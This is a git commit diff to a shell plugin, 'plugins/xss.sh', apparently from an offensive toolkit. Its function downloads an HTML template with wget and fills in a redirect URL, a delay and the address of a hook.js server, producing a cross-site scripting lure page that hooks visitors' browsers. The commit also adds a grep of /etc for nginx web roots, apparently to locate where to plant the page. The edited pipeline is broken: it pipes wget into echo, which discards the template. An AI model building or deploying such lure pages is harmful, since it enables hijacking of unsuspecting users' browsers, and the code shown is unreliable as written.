3e5b4e30396961dc3d69d4d3b289bebc246013ca
root <root@localhost.localdomain>
2019-04-23 08:25:38 -0400

    add xss gen

--- plugins/xss.sh
+++ plugins/xss.sh
@@ -1,10 +1,21 @@
 gglog "load xss-html gen a xss html"
 xss-html(){
-  gglog "set jump to url: "
+  gglog "searching nginx's configi...."
+  grep -nr "root" /etc/  | grep nginx
+  gglog "set jump to url: default www.google.com [Enter/url] "
   read gourl;
-  gglog "set hook.js 's ip: exam: xx.x.x.x:3000 "
+  if [[ $gourl == "" ]]; then
+	  gourl="www.google.com";
+  fi
+  gglog "set hook.js 's ip: default: localhost:3000 [Enter/ip:port]"
   read ip;
-  gglog "set how many sec to delay then jumt real site"
+  if [[ $ip == "" ]]; then
+	  ip="localhost:3000";
+  fi
+  gglog "set how many sec to delay then jumt real site default: 3 [Enter/int] "
   read sec;
-  wget -q -O- 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/xss-res/_template.html' |  sed "s/{sec}/${ip}/g; s/{gourl}/${gourl}/g; s/{ip}/${ip}/g "
+  if [[ $sec == "" ]]; then
+	  sec="3";
+  fi
+  wget -q -O- 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/xss-res/_template.html' |  echo "s/{sec}/$(echo $ip | xargs)/g; s/{gourl}/$(echo $gourl | xargs)/g; s/{ip}/$(echo $ip| xargs)/g "
 }
